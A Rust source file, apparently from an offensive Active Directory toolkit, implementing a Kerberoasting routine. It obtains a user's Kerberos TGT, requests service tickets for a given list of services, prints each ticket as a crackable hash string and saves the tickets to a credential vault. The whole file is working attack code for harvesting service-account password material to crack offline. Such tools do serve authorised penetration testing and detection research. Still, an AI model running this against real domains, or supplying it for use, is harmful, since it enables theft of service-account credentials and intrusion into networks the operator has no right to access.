use crate::core::CredentialFormat;
use crate::core::KerberosUser;
use crate::core::{get_user_tgt, request_tgs};
use crate::core::{tgs_to_crack_string, CrackFormat};
use crate::error::Result;
use crate::transporter::KerberosTransporter;
use kerberos_crypto::Key;
use log::info;
use crate::core::Vault;

pub fn kerberoast(
    user: KerberosUser,
    services: Vec<String>,
    vault: &dyn Vault,
    user_key: Option<&Key>,
    transporter: &dyn KerberosTransporter,
    cred_format: CredentialFormat,
    crack_format: CrackFormat,
    etype: Option<i32>,
) -> Result<()> {
    let username = user.name.clone();
    let (mut krb_cred_plain, cred_format, tgt) =
        get_user_tgt(user.clone(), vault, user_key, transporter, cred_format)?;    

    for service in services {
        match request_tgs(user.clone(), service.clone(), tgt.clone(), transporter) {
            Err(err) => match &err {
                _ => return Err(err),
            },
            Ok(tgs) => {
                let crack_str = tgs_to_crack_string(
                    &username,
                    &service,
                    &tgs.ticket,
                    crack_format,
                );
                println!("{}", crack_str);
                krb_cred_plain.push(tgs);
            }
        }
    }

    info!("Save {} TGSs in {}", username, vault.id());
    vault.save(krb_cred_plain.into(), cred_format)?;

    return Ok(());
}
